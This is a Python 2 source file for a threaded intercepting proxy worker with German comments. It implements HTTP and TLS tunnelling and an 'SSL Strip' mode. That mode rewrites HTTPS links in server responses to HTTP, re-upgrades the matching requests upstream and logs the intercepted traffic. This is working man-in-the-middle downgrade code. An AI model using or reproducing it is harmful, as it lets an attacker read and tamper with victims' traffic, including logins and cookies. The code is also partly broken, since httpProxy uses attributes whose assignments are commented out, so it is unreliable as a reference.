# coding=utf-8
import socket
from threading import Thread
import errno
from SSLServerThread import ProxyWorkerServerSSL
import datetime
import time
import ssl

'''from signal import signal, SIGPIPE, SIG_DFL
#Ignore SIG_PIPE and don't throw exceptions on it... (http://docs.python.org/library/signal.html)
signal(SIGPIPE,SIG_DFL)'''

DATASIZE = 4096


class ProxyWorker(Thread):
    def __init__(self, client_sock, port, debugger, functions, plugins):
        Thread.__init__(self)
        self._client_sock = client_sock
        self._server_sock = None
        self._port = port
        self._functions = functions
        self._hostname = ""
        #self._changeToHttp = plugins[1]
        #self._noCookies = plugins[2]
        #self._redirect = plugins[3]
        self._id = self.ident
        self._debugger = debugger
        self._sslstrip = plugins

    def run(self):
        request = self.getRequest()
        self._hostname = self._functions.getHostname(request)
        # print hostname

        if not request or request == "stop":
            if not self._server_sock == None:
                self._server_sock.close()
            self._client_sock.close()
            return

        if self._sslstrip:
            self.sslStrip(request) #SSL Strip mechanic
        elif "CONNECT" in request:
            self.tlsProxy(request)
        else:
            self.httpProxy(request)

        self._client_sock.close()

        # Close socket after job is done
        if not self._server_sock == None:
            self._debugger.printMessage("[+] ******** DEBUG CLOSE SERVER SOCKET ********", "info")
            self._server_sock.close()

        self._debugger.printMessage("[+] ##### DEBUG END THREAD #####", "info")
        return

    def tlsProxy(self, request):
        self._server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server_sock.connect((self._hostname, 443))

        request = self._functions.changeConnectionType(request)

        sslProxy = ProxyWorkerServerSSL(self._server_sock, self._client_sock, self._debugger)

        sslProxy.start()
        self._debugger.log(request)
        http_ok = "HTTP/1.1 200 OK\r\n\r\n"

        try:
            self._client_sock.sendall(bytes(http_ok))
        except socket.error, e:
            if e.errno == errno.EPIPE:
                self._debugger.printMessage("[-] Broken pipe - Error", "error")

        ts = time.time()
        while True:
            req = self._client_sock.recv(DATASIZE)
            st = datetime.datetime.fromtimestamp(ts).strftime('%Y-%m-%d %H:%M:%S')
            if not req or req == "stop":
                break

            try:
                self._server_sock.sendall(bytes(req))
            except socket.error, e:
                if e.errno == errno.EPIPE:
                    self._debugger.printMessage("[-] Broken pipe - Error Client -> Server - 'tls/ssl proxy", "error")
                    break

        # Wait for thread before closing this connection in the run() function
        sslProxy.join()

    def httpProxy(self, request):
        request = self._functions.changeAbsoluteToRelativeHostname(request)
        request = self._functions.changeHTTP11to10(request)
        request = self._functions.changeEncoding(request)
        request = self._functions.changeConnectionType(request)

        ts = time.time()
        print("\n########## Client request ##########")
        print(request)
        self._debugger.log(request)

        self._server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server_sock.connect((self._hostname, 80))

        self._server_sock.sendall(request)

        req = ""
        while True:
            response = self._server_sock.recv(DATASIZE)
            st = datetime.datetime.fromtimestamp(ts).strftime('%Y-%m-%d %H:%M:%S')
            if not response or response == "stop":
                break

            if self._changeToHttp == True:
                response = self._functions.changeHTTPtoHTTPS(response)

            if self._noCookies == True:
                response = self._functions.noCookies(response)

            try:
                self._client_sock.sendall(bytes(response))
            except socket.error, e:
                if e.errno == errno.EPIPE:
                    self._debugger.printMessage("[-] Broken pipe - Error - 'httpProxy'", "error")
                    break

            req += response

        self._debugger.log(self._functions.getHeader(req))

    def getRequest(self):

        req = ""
        while True:
            request = self._client_sock.recv(DATASIZE)
            req += request

            # Wenn ende erreicht dann break
            if "\r\n\r\n" in req:
                break;

        return req

    def sslStrip(self, request):

        if "CONNECT" in self._functions.getFirstLine(request):
            self._debugger.printMessage("[-] No SSLStrip possible, switch to normal SSL tunneling", "error")
            self.tlsProxy(request)
            return

        self._debugger.printMessage("[+] SSL Strip mode!", "warning")
        request = self._functions.changeHTTP11to10(request)
        request = self._functions.changeEncoding(request)
        request = self._functions.changeConnectionType(request)

        '''Den request kontrollieren ob links aufgerufen werden die im response
           auf HTTP geändert wurden, wenn ja den request auf HTTPS ändern und
           im eigenen Thread die SSL verbindung  erzeugen und den request der
           geändert wurde dann an den server schicken'''

        oldreq = request
        request = self._functions.checkLinks(request)

        self._server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server_sock.settimeout(10)

        if not oldreq == request:
            self._debugger.printMessage("[+] SSLStrip successfull", None)
            self._debugger.log(request)
            host = self._functions.getHostname(request)
            port = 443
            self._server_sock = ssl.wrap_socket(self._server_sock, ssl_version=ssl.PROTOCOL_TLSv1)
            self._server_sock.connect((host, port))
            self._server_sock.send(request)
        else:
            self._server_sock.connect((self._hostname, 80))
            self._server_sock.sendall(request)

        self._debugger.log(request)

        req = ""
        while True:
            response = self._server_sock.recv(DATASIZE)

            if not response or response == "stop":
                break

            #Changing links from response to https
            response = self._functions.changeResponseLinks(response)


            try:
                self._client_sock.sendall(bytes(response))
            except socket.error, e:
                if e.errno == errno.EPIPE:
                    self._debugger.printMessage("[-] Broken pipe - Error - 'httpProxy'", "error")
                    break

            req += response

        self._debugger.log(req)
        #print("Server response with Stripped https links")
        #print(str(req))
        #self._debugger.log(self._functions.getHeader(req))


